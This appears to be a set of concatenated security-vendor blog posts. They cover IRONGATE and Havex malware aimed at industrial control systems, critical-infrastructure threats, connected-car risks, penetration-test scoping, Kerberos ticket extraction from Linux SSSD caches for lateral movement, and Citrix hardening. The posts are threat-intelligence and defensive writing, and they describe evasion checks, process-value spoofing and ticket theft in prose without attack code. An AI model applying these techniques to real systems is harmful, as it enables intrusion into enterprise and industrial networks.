five, but fewer than ten characters are inspected for the subdirectories drop, files, logs, memory, and shots. If a matching directory is found, the dropper does not attempt to deploy the scada.exe payload. The update.exe 1 and update.exe 3 droppers contain code for an additional Cuckoo check using the SysInternals pipelist program, install.exe , but the code is disabled in each. The update.exe 2 dropper includes a check for VMware instead of Cuckoo. The VMWare check looks for the registry key HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools and the files %WINDIR% \\system32\\drivers\\vmmouse.sys and %WINDIR% \\system32\\drivers\\vmhgfs.sys . If any of these are found, the dropper does not attempt to deploy the scada.exe payload. The dropper bla.exe does not include an environment check for either Cuckoo or VMware. scada.exe Payload We surmise that scada.exe is a user-created payload used for testing the malware. First, our analysis did not indicate what triggers scada.exe to run. Second, Siemens ProductCERT informed us that scada.exe is not a default file name associated with Siemens industrial control software. When scada.exe executes, it scans drives attached to the system for filenames ending in Step7ProSim.dll . According to the Siemens ProductCERT, Step7ProSim.dll is not part of the Siemens PLCSIM software. We were unable to determine whether this DLL was created specifically by the malware author, or if it was from another source, such as example code or a particular custom ICS implementation. We surmise this DLL simulates generation of IO values, which would normally be provided by an S7-based controller, since the functions it includes appear derived from the Siemens PLCSIM environment. If scada.exe finds a matching DLL file name, it kills all running processes with the name biogas.exe . The malware then moves Step7ProSim.dll to Step7ConMgr.dll and drops a malicious Step7ProSim.dll – the IRONGATE payload – to the same directory. The malicious Step7ProSim.dll acts as an API proxy between the original user-created Step7ProSim.dll (now named Step7ConMgr.dll ) and the application biogas.exe that loads it. Five seconds after loading, the malicious Step7ProSim.dll records five seconds of calls to ReadDataBlockValue . All future calls to ReadDataBlockValue return the recorded data. Simultaneously, the malicious DLL discards all calls to WriteDataBlockValue and instead calls WriteInputPoint(0x110, 0, 0x7763) and WriteInputPoint(0x114, 0, 0x7763) every millisecond. All of these functions are named similarly to Siemens S7ProSim v5.4 COM interface. It appears that other calls to API functions are passed through the malicious DLL to the legitimate DLL with no other modification. Biogas.exe As mentioned previously, IRONGATE seeks to manipulate code similar to that found on a blog dealing with simulating PLC communications using PLCSIM, including the use of an executable named biogas.exe . Examination of the executable from that blog’s demo code shows that the WriteInputPoint function calls with byte indices 0x110 and 0x114 set pressure and temperature values, respectively: IRONGATE: WriteInputPoint(0x110, 0, 0x7763) WriteInputPoint(0x114, 0, 0x7763) Equivalent pseudo code from Biogas.exe: S7ProSim.WriteInputPoint(0x110, 0, (short)this.Pressure.Value) S7ProSim.WriteInputPoint(0x114, 0, (short)this.Temperature.Value) We have been unable to determine the significance of the hardcoded value 0x7763 , which is passed in both instances of the write function. Because of the noted indications that IRONGATE is a proof of concept, we cannot conclude IRONGATE’s author intends to manipulate specific temperature or pressure values associated with the specific biogas.exe process, but find the similarities to this example code striking. Artifacts and Indicators PyInstaller Artifacts The IRONGATE droppers are Python scripts converted to executables using PyInstaller. The compiled droppers contain PyInstaller artifacts from the system the executables were created on. These artifacts may link other samples compiled on the same system. Five of the six file droppers ( bla.exe, update.exe 1 , update_no_pipe.exe 1 , update_no_pipe.exe 2 and update.exe 3 ) all share the same PyInstaller artifacts listed in Table 1. Table 1: Pyinstaller Artifacts The remaining dropper, update.exe 2 , contains the artifacts listed in Table 2. Table 2: Pyinstaller Artifacts for update.exe 2 Unique Strings Figure 1 and 2 list the unique strings discovered in the scada.exe and Step7ProSim.dll binaries. Figure 1: Scada.exe Unique Strings Figure 2: Step7ProSim.dll Unique Strings File Hashes Table 3 contains the MD5 hashes, file and architecture type, and compile times for the malware analyzed in this report.

                "text": "FireEye recently analyzed the capabilities of a variant of Havex (referred to by FireEye as “Fertger” or “PEACEPIPE”), the first publicized malware reported to actively scan OPC servers used for controlling SCADA (Supervisory Control and Data Acquisition) devices in critical infrastructure (e.g., water and electric utilities), energy, and manufacturing sectors. While Havex itself is a somewhat simple PHP Remote Access Trojan (RAT) that has been analyzed by other sources, none of these have covered the scanning functionality that could impact SCADA devices and other industrial control systems (ICS) . Specifically, this Havex variant targets servers involved in OPC (Object linking and embedding for Process Control) communication, a client/server technology widely used in process control systems (for example, to control water pumps, turbines, tanks, etc.). Note: ICS is a general term that encompasses SCADA (Supervisory Control and Data Acquisition) systems, DCS (Distributed Control Systems), and other control system environments. The term SCADA is well-known to wider audiences, and throughout this article, ICS and SCADA will be used interchangeably. Threat actors have leveraged Havex in attacks across the energy sector for over a year, but the full extent of industries and ICS systems affected by Havex is unknown. We decided to examine the OPC scanning component of Havex more closely, to better understand what happens when it’s executed and the possible implications. OPC Testing Environment To conduct a true test of the Havex variant’s functionality, we constructed an OPC server test environment that fully replicates a typical OPC server setup (Figure 1 [3] ). As shown, ICS or SCADA systems involve OPC client software that interacts directly with an OPC server, which works in tandem with the PLC (Programmable Logic Controller) to control industrial hardware (such as a water pump, turbine, or tank). FireEye replicated both the hardware and software the OPC server setup (the components that appear within the dashed line on the right side of Figure 1). Figure 1: Topology of typical OPC server setup The components of our test environment are robust and comprehensive to the point that our system could be deployed in an environment to control actual SCADA devices. We utilized an Arduino Uno [1] as the primary hardware platform, acting as the OPC server. The Arduino Uno is an ideal platform for developing an ICS test environment because of the low power requirements, a large number of libraries to make programming the microcontroller easier, serial communication over USB, and cheap cost. We leveraged the OPC Server and libraries from St4makers [2] (as shown in Figure 2). This software is available for free to SCADA engineers to allow them to develop software to communicate information to and from SCADA devices. Figure 2: OPC Server Setup Using the OPC Server libraries allowed us to make the Arduino Uno act as a true, functioning OPC SCADA device (Figure 3). Figure 3: Matrikon OPC Explorer showing Arduino OPC Server We also used Matrikon’s OPC Explorer [1] , which enables browsing between the Arduino OPC server and the Matrikon embedded simulation OPC server. In addition, the Explorer can be used to add certain data points to the SCADA device – in this case, the Arduino device. Figure 4: Tags identified for OPC server In the OPC testing environment, we created tags in order to simulate a true OPC server functioning. Tags, in relation to ICS devices, are single data points. For example: temperature, vibration, or fill level. Tags represent a single value monitored or controlled by the system at a single point in time. With our test environment complete, we executed the malicious Havex “.dll\" file and analyzed how Havex’s OPC scanning module might affect OPC servers it comes in contact with. Analysis The particular Havex sample we looked at was a file named PE.dll (6bfc42f7cb1364ef0bfd749776ac6d38). When looking into the scanning functionality of the particular Havex sample, it directly scans for OPC servers, both on the server the sample was submitted on, and laterally, across the entire network. The scanning process starts when the Havex downloader calls the runDll export function.  The OPC scanner module identifies potential OPC servers by using the Windows networking (WNet) functions.  Through recursive calls to WNetOpenEnum and WNetEnumResources, the scanner builds a list of all servers that are globally accessible through Windows networking.  The list of servers is then checked to determine if any of them host an interface to the Component Object Models (COM) listed below: Figure 5: Relevant COM objects Once OPC servers are identified, the following CLSIDs are used to determine the capabilities of the OPC server: Figure 6: CLSIDs used to determine capabilities of the OPC server When executing PE.dll, all of the OPC server data output is first saved as %TEMP%\\[random].tmp.dat. The results of a capability scan of an OPC server is stored in %TEMP%\\OPCServer[random].txt. Files are not encrypted or deleted once the scanning process is complete. Once the scanning completes, the log is deleted and the contents are encrypted and stored into a file named %TEMP%\\[random].tmp.yls.  The encryption process uses an RSA public key obtained from the PE resource TYU.  The RSA key is used to protect a randomly generated 168-bit 3DES key that is used to encrypt the contents of the log. The TYU resource is BZip2 compressed and XORed with the string “1312312”.  A decoded configuration for 6BFC42F7CB1364EF0BFD749776AC6D38 is included in the figure below: Figure 7: Sample decoded TYU resource The 4409de445240923e05c5fa6fb4204 value is believed to be an RSA key identifier.

These are not the in-depth results of the OPC servers themselves, and only perform the initial scanning. The particular Havex sample in question also enumerates OPC tags and fully interrogates the OPC servers identified within %TEMP%\\[random].tmp.dat. The particular fields queried are: server state, tag name, type, access, and id. The contents of a sample %TEMP%\\OPCServer[random].txt can be found below: Figure 10: Contents of OPCServer[Random].txt OPC interrogation While we don’t have a particular case study to prove the attacker’s next steps, it is likely after these files are created and saved, they will be exfiltrated to a command and control server for further processing. Conclusion Part of threat intelligence requires understanding all parts of a particular threat. This is why we took a closer look at the OPC functionality of this particular Havex variant.  We don’t have any case study showcasing why the OPC modules were included, and this is the first “in the wild” sample using OPC scanning. It is possible that these attackers could have used this malware as a testing ground for future utilization, however. Since ICS networks typically don’t have a high-level of visibility into the environment, there are several ways to help minimize some of the risks associated with a threat like Havex. First, ICS environments need to have the ability to perform full packet capture ability. This gives incident responders and engineers better visibility should an incident occur. Also, having mature incident processes for your ICS environment is important. Being able to have security engineers that also understand ICS environments during an incident is paramount. Finally, having trained professionals consistently perform security checks on ICS environments is helpful. This ensures standard sets of security protocols and best practices are followed within a highly secure environment. We hope that this information will further educate industrial control systems owners and the security community about how the OPC functionality of this threat works and serves as the foundation for more investigation. Still, lots of questions remain about this component of Havex. What is the attack path? Who is behind it? What is their intention? We’re continuing to track this specific threat and will provide further updates as this new tactic unfolds. Acknowledgements We would like to thank Josh Homan for his help and support.

                "text": "The term \"critical infrastructure\" has earned its spot on the board of our ongoing game of cyber bingo--right next to \"Digital Pearl Harbor,\" \"Cyber 9/11,\" \"SCADA\" and \"Stuxnet.\" With \"critical infrastructure\" thrown about in references to cyber threats nearly every week, we thought it was time for a closer look at just what the term means-and what it means to other cyber threat actors. The term \" critical infrastructure \" conjures up images of highways, electrical grids, pipelines, government facilities and utilities. But the U.S. government definition also includes economic security and public health. The Department of Homeland Security defines critical infrastructure as \"Systems and assets, whether physical or virtual, so vital to the United States that the incapacity or destruction of such systems and assets would have a debilitating impact on security, national economic security, national public health or safety, or any combination of those matters.\" [1] Certainly the U.S. definition is expansive, but some key cyber actors go a step further to include a more abstract \"information \" asset. Russian officials view information content, flow and influencers as an enormous component of critical infrastructure. Iran and China similarly privilege the security of their information assets in order to protect their governments. The bottom line? U.S. companies, who may have never considered themselves a plausible target for cyber threats, could become victims of offensive or defensive state cyber operations. Earlier this year several media outlets-including the New York Times and Washington Post-disclosed that they had been the victims of China-based intrusions. The Times and the Post linked the intrusions on their networks to their reporting on corruption in the upper echelons of the Chinese Communist Party and other issues. These media outlets weren't sitting on plans for a new fighter jet or cutting edge wind turbines-information often assumed to be at risk for data theft. Rather, the reporters at the Times and Post were perched in key positions to influence U.S. government and public views of the Chinese leadership, possibly in a negative light. The Chinese government had conducted these intrusions against what it deemed critical infrastructure that supported the flow of valuable information. Who's up next? State actors motivated to target critical infrastructure (by their own definition or the U.S.') won't just be the usual attention grabbers in cyberspace. We estimate that Iran, Syria, and North Korea all have interest and would be able to conduct or direct some level of network operations. These states are also likely to conduct operations in the near term to identify red lines and gauge corporate and government reactions. With little reputational loss at stake, we expect actors sponsored by or associated with these states to target an array of critical infrastructure targets. Companies who serve as key information brokers-for the public or the U.S. government-should be particularly attuned to the criticality their work is assigned by a variety of cyber threat actors. http://www.nist.gov/itl/upload/preliminary-cybersecurity-framework.pdf Subscribe to Blogs Get email updates as new blog posts are added."

                "text": "As vehicles become both increasingly complex and better connected to the Internet, their newfound versatility may be manipulated for malicious purposes. Three of the most concerning potential threats looking ahead to the next few years are those posed by manipulating vehicle operation , ransomware and using vehicular systems as command and control (C2) infrastructure for illicit cyber activity. Car Hacking? Vehicles have come a long way in terms of the high-tech features and connectivity that come standard in most new models. Modern cars are controlled almost entirely by software, and many drivers don’t realize the most complex digital device they own may be in their driveway . Of the growing number of devices in the “Internet of Things” (IoT), vehicles are among the most significant additions to the global Internet. An ever-growing list of features—including web browsing, Wi-Fi access points, and remote-start mobile phone apps—enhance user enjoyment, but also greatly expand vehicles’ attack surface, rendering them potentially vulnerable to advanced attacks. During the past year especially, numerous proof-of-concept demonstrations have revealed connected-car vulnerabilities that malicious actors can exploit, ranging from unauthorized entry to commandeering the vehicle’s operation . Unfortunately, as consumer demand drives ever more features, the opportunities for compromise will increase as well. Ransomware The scourge of ransomware has so far affected thousands of systems belonging to ordinary individuals, hospitals, and police stations. A vehicle’s increased connectivity, ever-expanding attack surface, and high upfront cost make them attractive ransomware targets. In contrast to ransomware that infects ordinary computer systems, vehicles are more likely susceptible to ransomware attacks when their disablement causes knock-on effects. For example, where a single driver might be able to reinstall his car’s software with the help of a mechanic to remedy a ransomware infection, a group of vehicles disabled on a busy highway could cause far more serious disruption. Victims or municipal authorities may have little choice but to pay the ransom to reopen a busy commuting route. Alternatively, a logistics company might suddenly find a large portion of its truck fleet rendered useless by ransomware. The potential for lost revenue due to downtime might pressure the company to pay the ransom rather than risk more significant financial losses. Malicious C2 and Final Hop Points One effective law enforcement tactic in countering cyber espionage and criminal campaigns is identifying, locating and seizing the systems threat actors use to route malicious traffic through the Internet. Since many modern vehicles can be better described as a computer attached to four wheels and an engine, their mobility and power present challenges to this means of countering threat activity. We have already witnessed malware designed to hijack IoT devices for malicious purposes; vehicular systems’ greater computing power, compared to connected home thermostats, can significantly enhance their value as a C2 node . Locating vehicles used to route malicious traffic would present a major challenge to law enforcement investigation, largely due to their mobility. We have not yet observed threat actors using connected vehicle systems to route malicious traffic, but it is most likely that a vehicle would be used as a final hop point to the intended target network. The perpetrators may use the vehicle only once, choosing to hijack the connectivity of a different vehicle on their next operation, and so on. This ever-changing roster of potential last-hop nodes situated on highly mobile platforms may allow threat actors to elude law enforcement for extended periods of time. Understanding the Risk Landscape The impact of cyber threats is most often considered in financial terms—the cost of a breach, whether direct financial losses or indirect costs of investigation, remediation, and improved security. As computers increasingly control vehicles, among other critical devices and systems, the potential for malfunction or manipulation that causes human harm rises dramatically. Automobile manufacturers may face greater liability, not only for the car’s physical components, but its software as well. How long before vehicles need a “cyber security rating,” similar to that awarded for crash testing and fuel economy? These new risks point to the need for automotive manufacturers and suppliers to not only ensure the traditional operational safety of their vehicles, but to also secure both the vehicle's operations and occupant privacy. This requires an ongoing understanding about the nature of threats and vulnerabilities in a rapidly evolving landscape, and building in strong proactive security measures to protect against these risks. FireEye explores these risks to automotive safety in our latest FireEye iSIGHT Intelligence and Mandiant Consulting report: Connected Cars: The Open Road for Hackers .

                "text": "Often in discussions with customers and potential customers,\nquestions arise about our penetration testing services , as well as\npenetration testing in general. In this post, we want to walk\nthrough Mandiant's take on the five W's of penetration testing, in\nhopes of helping those of you who many have some of these same\nquestions. For clarity, we are going to walk through these W's in a\nnon-traditional order. Why First and foremost, it's important to be upfront\nwith yourself with why you are having a penetration test performed\n(or at least considering one). If your organization's primary\nmotivation is compliance and needing to \"check the box,\"\nthen be on the lookout for your people attempting to subtly (or not\nso subtly) hinder the test in order to earn an \"easy pass\"\nby minimizing the number of findings (and therefore the amount of\npotential remediation work required). Individuals could attempt to\nhinder a penetration test by placing undue restrictions on the scope\nof systems assessed, the types of tools that can be used, or the\ntiming of the test. Even if compliance is a motivating\nfactor, we hope you're able to take advantage of the opportunity\npenetration testing provides to determine where vulnerabilities lie\nand make your systems more secure. That is the real value that\npenetration testing can provide. Finally, if you are getting\na penetration test to comply with requirements imposed on your\norganization, that will often drive some of the answers to later\nquestions about the type and scope of the test. Keep in mind that\nstandards only dictate minimum requirements, however, so you should\nalso consider additional penetration testing activities beyond the\n\"bare minimum.\" Who There are really two \"who\" questions to\nconsider, but for now we will just deal with the first: Who are the\nattackers that concern you? Are they: Random\nindividuals on the Internet? Specific threat actors, such\nas state-sponsored attackers, organized criminals, or hacktivist\ngroups? An individual or malware that is behind the\nfirewall and on your internal corporate network? Your own\nemployees (\"insider threats\")? Your customers\n(or attackers who may compromise customers'\nsystems/accounts)? Your vendors, service providers, and\nother business partners (or attackers who may have compromised\ntheir systems)? The answer to this will help drive\nthe type of testing to be performed and the types of test user\naccounts (if any) to provision. The next section will describe some\npossible penetration test types, but it's helpful to also discuss\nthe types of attackers you would like the penetration test to\nsimulate. What What type of penetration test do you want\nperformed? For organizations new to penetration testing, we\nrecommend starting with an external network penetration test, which\nwill assess your Internet-accessible systems in the same way that an\nattacker anywhere in the world could access them. Beyond that, there\nare several options: Internal network penetration test\n- A penetration test of your internal corporate network. Typically\nwe start these types of assessments with only a network connection\non the corporate networks, but a common variant is what we call an\n\"Insider Threat Assessment,\" where we start with one of\nyour standard workstations and a standard user account. Web application security assessment - A review of custom web\napplication code for security vulnerabilities such as access\ncontrol issues, SQL injection, cross-site scripting (XSS) and\nothers. These are best done in a test or development environment\nto minimize impact to the production environment. Social\nengineering - Using deceptive email, phone calls, and/or physical\nentry to gain access to systems. Wireless penetration\ntest - A detailed security assessment of wireless network(s) at\none or more of your locations. This typically includes a survey of\nthe location looking for unauthorized (\"rogue\") wireless\naccess points that have been connected to the corporate network\nand are often insecurely configured. If budgets were\nnot an issue, you would want to do all of the above, but in reality\nyou will need to prioritize your efforts on what makes sense for\nyour organization. Keep in mind that the best approach may change\nover time as your organization matures. Where In what physical location should the test take\nplace? Many types of penetration testing can be done remotely, but\nsome require the testers to visit your facility. Physical social\nengineering engagements and wireless assessments clearly need to be\nperformed at one (or more) of your locations. Some internal\npenetration tests can be done remotely via a VPN connection, but we\nrecommend conducting them at your location whenever possible. If\nyour internal network has segmentation in place (as we recommend),\nthen you should work with your penetration testing organization to\ndetermine the best physical location for the test to be performed.\nGenerally, you'll want to do the internal penetration test from a\nnetwork segment that has broad access to other portions of the\ninternal network in order to get the best coverage from the\ntest. Another \"Where\" to consider for remote testing\nis where the testers are physically located. When testers are in a\ndifferent country than you, legal issues can arise with data\nprovisioning and accessibility. Differences in language, culture,\nand time zones could also make coordination and interpretation of\nresults more difficult. When We recommend that most organizations get some\nsort of security assessment on an annual basis, but that security\nassessment does not necessarily need to be a penetration test (see Penetration\nTesting Has Come Of Age - How to Take Your Security Program to the\nNext Level ). Larger organizations may have multiple\nassessments per year, each focused in a different area. Within the year, the timing of the penetration test is usually\npretty flexible. You will want to make sure that the right people\nfrom your organization are available to initiate and manage the test\n- and to receive results and begin implementing changes. Based on\nyour organization's change control procedures, you may need to work\naround system freezes or other activities. Testing in December can\nbe difficult due to holidays and vacation, along with year-end\ncloseout activities, especially for organizations in retail,\ne-commerce, and payment processing. If you have significant\nupgrades planned for the systems that will be tested, it is\ntypically best to schedule the test for a month or two after the\nupgrades are due to be finished. This will allow some time for the\ninevitable delays in deploying the upgrades as well give the\nupgraded systems (and their administrators) a bit of time to\n\"settle in\" and get fully configured before being\ntested. Who (part 2) The other \"who\" question to\nconsider is who will perform the penetration test? We recommend\nconsidering the following when selecting a penetration testing\nprovider: What are the qualifications of the organization\nand the individuals who will be performing the test? What\ndifferentiates them from other providers? To what degree\ndoes their testing rely on automated vulnerability scanners vs.\nhands on manual testing? How well do they understand the\nthreat actors that are relevant to your environment? How well are\nthey able to emulate real world attacks? What\ndeliverables will you receive from the test? Are they primarily\nthe output of an automated tool? Ask for samples. Are\nthey unbiased? Do they use penetration tests as a means to sell or\nresell other products and services? No doubt, there\nare other questions that you will want to consider when scoping a\npenetration test, but we hope that these will help you get started.\nIf you'd like to read more about Mandiant's penetration testing (and\nother) services, you can do so here . Of course,\nalso feel free to contact\nus if you'd like to talk about your situation and how Mandiant\ncan best assess your organization's security.

                "text": "At FireEye Mandiant , we conduct numerous red team engagements within Windows Active Directory environments. Consequently, we frequently encounter Linux systems integrated within Active Directory environments. Compromising an individual domain-joined Linux system can provide useful data on its own, but the best value is obtaining data, such as Kerberos tickets, that will facilitate lateral movement techniques. By passing these Kerberos Tickets from a Linux system, it is possible to move laterally from a compromised Linux system to the rest of the Active Directory domain. There are several ways to configure a Linux system to store Kerberos tickets. In this blog post, we will introduce Kerberos and cover some of the various storage solutions. We will also introduce a new tool that extracts Kerberos tickets from domain-joined systems that utilize the System Security Services Daemon Kerberos Cache Manager (SSSD KCM). What is Kerberos Kerberos is a standardized authentication protocol that was originally created by MIT in the 1980s. The protocol has evolved over time. Today, Kerberos Version 5 is implemented by numerous products, including Microsoft Active Directory. Kerberos was originally designed to mutually authenticate identities over an unsecured communication line. The Microsoft implementation of Kerberos is used in Active Directory environments to securely authenticate users to various services, such as the domain (LDAP), database servers (MSSQL) and file shares (SMB/CIFS). While other authentication protocols exist within Active Directory, Kerberos is one of the most popular methods. Technical documentation on how Microsoft implemented Kerberos Protocol Extensions within Active Directory can be found in the MS-KILE standards published on MSDN. Short Example of Kerberos Authentication in Active Directory To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP. There are two main types of Kerberos tickets used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller. The diagram in Figure 1 shows the authentication flow. Figure 1: Example Kerberos authentication flow In summary: The user requests a Ticket Granting Ticket (TGT) from the Domain Controller. Once granted, the user passes the TGT back to the Domain Controller and requests a service ticket for cifs/SQLSERVER.ACMENET.CORP. After the Domain Controller validates the request, a service ticket is issued that will authenticate the user to the CIFS (SMB) service on SQLSERVER.ACMENET.CORP. The user receives the service ticket from the Domain Controller and initiates an SMB negotiation with SQLSERVER.ACMENET.CORP. During the authentication process, the user provides a Kerberos blob inside an “AP-REQ” structure that includes the service ticket previously obtained. The server validates the service ticket and authenticates the user. If the server determines that the user has permissions to access the share, the user can begin making SMB queries. For an in-depth example of how Kerberos authentication works, scroll down to view the appendix at the bottom of this article. Kerberos On Linux Domain-Joined Systems When a Linux system is joined to an Active Directory domain, it also needs to use Kerberos tickets to access services on the Windows Active Directory domain. Linux uses a different Kerberos implementation. Instead of Windows formatted tickets (commonly referred to as the KIRBI format), Linux uses MIT format Kerberos Credential Caches (CCACHE files). When a user on a Linux system wants to access a remote service with Kerberos, such as a file share, the same procedure is used to request the TGT and corresponding service ticket. In older, more traditional implementations, Linux systems often stored credential cache files in the /tmp directory. Although the files are locked down and not world-readable, a malicious user with root access to the Linux system could trivially obtain a copy of the Kerberos tickets and reuse them. On modern versions of Red Hat Enterprise Linux and derivative distributions, the System Security Services Daemon (SSSD) is used to manage Kerberos tickets on domain-joined systems. SSSD implements its own form of Kerberos Cache Manager (KCM) and encrypts tickets within a database on the system. When a user needs access to a TGT or service ticket, the ticket is retrieved from the database, decrypted, and then passed to the remote service (for more on SSSD, check out this great research from Portcullis Labs ). By default, SSSD maintains a copy of the database at the path /var/lib/sss/secrets/secrets.ldb. The corresponding key is stored as a hidden file at the path /var/lib/sss/secrets/.secrets.mkey. By default, the key is only readable if you have root permissions. If a user is able to extract both of these files, it is possible to decrypt the files offline and obtain valid Kerberos tickets. We have published a new tool called SSSDKCMExtractor that will decrypt relevant secrets in the SSSD database and pull out  the credential cache Kerberos blob. This blob can be converted into a usable Kerberos CCache file that can be passed to other tools, such as Mimikatz , Impacket , and smbclient . CCache files can be converted into Windows format using tools such as Kekeo . We leave it as an exercise to the reader to convert the decrypted Kerberos blob into a usable credential cache file for pass-the-cache and pass-the-ticket operations. Using SSSDKCMExtractor is simple. An example SSSD KCM database and key are shown in Figure 2. Figure 2: SSSD KCM files Invoking SSSDKCMExtractor with the --database and --key parameters will parse the database and decrypt the secrets as shown in Figure 3. Figure 3: Extracting Kerberos data After manipulating the data retrieved, it is possible to use the CCACHE in smbclient as shown in Figure 4. In this example, a domain administrator ticket was obtained and used to access the domain controller’s C$ share. Figure 4: Compromising domain controller with extracted tickets The Python script and instructions can be found on the FireEye Github. Conclusion By obtaining privileged access to a domain-joined Linux system, it is often possible to scrape Kerberos tickets useful for lateral movement. Although it is still common to find these tickets in the /tmp directory, it is now possible to also scrape these tickets from modern Linux systems that utilize the SSSD KCM. With the right Kerberos tickets, it is possible to move laterally to the rest of the Active Directory domain. If a privileged user authenticates to a compromised Linux system (such as a Domain Admin) and leaves a ticket behind, it would be possible to steal that user's ticket and obtain privileged rights in the Active Directory domain. Appendix: Detailed Example of Kerberos Authentication in Active Directory To illustrate how Kerberos works, we have selected a common scenario where a user John Smith with the account ACMENET.CORP\\sa_jsmith wishes to authenticate to a Windows SMB (CIFS) file share in the Acme Corporation domain, hosted on the server SQLSERVER.ACMENET.CORP. There are two main types of Kerberos ticket types used in Active Directory: Ticket Granting Ticket (TGT) and service tickets. Service tickets are obtained from the Ticket Granting Service (TGS). The TGT is used to authenticate the identity of a particular entity in Active Directory, such as a user account. Service tickets are used to authenticate a user to a specific service hosted on a domain- joined system. A valid TGT can be used to request service tickets from the Key Distribution Center (KDC). In Active Directory environments, the KDC is hosted on a Domain Controller. When the user wants to authenticate to the remote file share, Windows first checks if a valid TGT is present in memory on the user's workstation. If a TGT isn't present, a new TGT is requested from the Domain Controller in the form of an AS-REQ request. To prevent password cracking attacks ( AS-REP Roasting ), by default, Kerberos Preauthentication is performed first. Windows creates a timestamp and encrypts the timestamp with the user's Kerberos key (Note: User Kerberos keys vary based on encryption type. In the case of RC4 encryption, the user's RC4 Kerberos key is directly derived from the user's account password. In the case of AES encryption, the user's Kerberos key is derived from the user's password and a salt based on the username and domain name). The domain controller receives the request and decrypts the timestamp by looking up the user's Kerberos key. An example AS-REQ packet is shown in Figure 5. Figure 5: AS-REQ Once preauthentication is successful, the Domain Controller issues an AS-REP response packet that contains various metadata fields, the TGT itself, and an \"Authenticator\". The data within the TGT itself is considered sensitive. If a user could freely modify the content within the TGT, they could impersonate any user in the domain as performed in the Golden Ticket attack. To prevent this from easily occurring, the TGT is encrypted with the long term Kerberos key stored on the Domain Controller. This key is derived from the password of the krbtgt account in Active Directory. To prevent users from impersonating another user with a stolen TGT blob, Active Directory’s Kerberos implementation uses session keys that are used for mutual authentication between the user, domain, and service. When the TGT is requested, the Domain Controller generates a session key and places it in two places: the TGT itself (which is encrypted with the krbtgt key and unreadable by the end user), and in a separate structure called the Authenticator. The Domain Controller encrypts the Authenticator with the user's personal Kerberos key. When Windows receives the AS-REP packet back from the domain controller, it caches the TGT ticket data itself into memory. It also decrypts the Authenticator with the user's Kerberos key and obtains a copy of the session key generated by the Domain Controller. Windows stores this session key in memory for future use. At this point, the user's system has a valid TGT that it can use to request service tickets from the domain controller. An example AS-REP packet is shown in Figure 6. Figure 6: AS-REP After obtaining a valid TGT for the user, Windows requests a service ticket for the file share service hosted on the remote system SQLSERVER.ACMENET.CORP. The request is made using the service's Service Principal Name (“SPN”). In this case, the SPN would be cifs/SQLSERVER.ACMENET.CORP. Windows builds the service ticket request in a TGS-REQ packet. Within the TGS-REQ packet, Windows places a copy of the TGT previously obtained from the Domain Controller. This time, the Authenticator is encrypted with the TGT session key previously obtained from the domain controller. An example TGS-REQ packet is shown in Figure 7. Figure 7: TGS-REQ Once the Domain Controller receives the TGS-REQ packet, it extracts the TGT from the request and decrypts it with the krbtgt Kerberos key. The Domain Controller verifies that the TGT is valid and extracts the session key field from the TGT. The Domain Controller then attempts to decrypt the Authenticator in the TGS-REQ packet with the session key. Once decrypted, the Domain Controller examines the Authenticator and verifies the contents. If this operation succeeds, the user is considered authenticated by the Domain Controller and the requested service ticket is created. The Domain Controller generates the service ticket requested for cifs/SQLSERVER.ACMENET.CORP. The data within the service ticket is also considered sensitive. If a user could manipulate the service ticket data, they could impersonate any user on the domain to the service as performed in the Silver Ticket attack. To prevent this from easily happening, the Domain Controller encrypts the service ticket with the Kerberos key of the computer the user is authenticating to. All domain-joined computers in Active Directory possess a randomly generated computer account credential that both the computer and Domain Controller are aware of. The Domain Controller also generates a second session key specific to the service ticket and places a copy in both the encrypted service ticket and a new Authenticator structure. This Authenticator is encrypted with the first session key (the TGT session key). The service ticket, Authenticator, and metadata are bundled in a TGS-REP packet and forwarded back to the user. An example TGS-REP packet is shown in Figure 8. Figure 8: TGS-REP Once Windows receives the TGS-REP for cifs/SQLSERVER.ACMENET.CORP, Windows extracts the service ticket from the packet and caches it into memory. It also decrypts the Authenticator with the TGT specific session key to obtain the new service specific session key. Using both pieces of information, it is now possible for the user to authenticate to the remote file share. Windows negotiates a SMB connection with SQLSERVER.ACMENET.CORP. It places a Kerberos blob in an \"ap-req\" structure. This Kerberos blob includes the service ticket received from the domain controller, a new Authenticator structure, and metadata. The new Authenticator is encrypted with the service specific session key that was previously obtained from the Domain Controller. The authentication process is shown in Figure 9. Figure 9: Authenticating to SMB (AP-REQ) Once the file share server receives the authentication request, it first extracts and decrypts the service ticket from the Kerberos authentication blob and verifies the data within. It also extracts the service specific session key from the service ticket and attempts to decrypt the Authenticator with it. If this operation succeeds, the user is considered to be authenticated to the service. The server will acknowledge the successful authentication by sending one final Authenticator back to the user, encrypted with the service specific session key. This action completes the mutual authentication process. The response (contained within an “ap-rep” structure) is shown in Figure 10. Figure 10: Final Authenticator (Mutual Authentication, AP-REP) A diagram of the authentication flow is shown in Figure 11.

                "text": "A Joint Whitepaper from Mandiant and Citrix Throughout the course of Mandiant’s Red Team and Incident Response engagements, we frequently identify a wide array of misconfigured technology solutions, including Citrix XenApp and XenDesktop. We often see attackers leveraging stolen credentials from third parties, accessing Citrix solutions, breaking out of published applications, accessing the underlying operating systems, and moving laterally to further compromise the environment. Our experience shows that attackers are increasingly using Citrix solutions to remotely access victim environments post-compromise, instead of using traditional backdoors, remote access tools, or other types of malware. Using a legitimate means of remote access enables attackers to blend in with other users and fly under the radar of security monitoring tools. Citrix provides extensive security hardening guidance and templates to their customers to mitigate the risk of these types of attacks. The guidance is contained in product-specific eDocs, Knowledge Base articles and detailed Common Criteria configurations. System administrators (a number of them wearing many hats and juggling multiple projects) may not have the time to review all of the hardening documentation available, so Mandiant and Citrix teamed up to provide guidance on the most significant risks posed to Citrix XenApp and XenDesktop implementations in a single white paper. This white paper covers risks and official Citrix hardening guidance for the following topics: Environment and Application Jailbreaking Network Boundary Jumping Authentication Weaknesses Authorization Weaknesses Inconsistent Defensive Measures Non-configured or Misconfigured Logging and Alerting The white paper is available here.

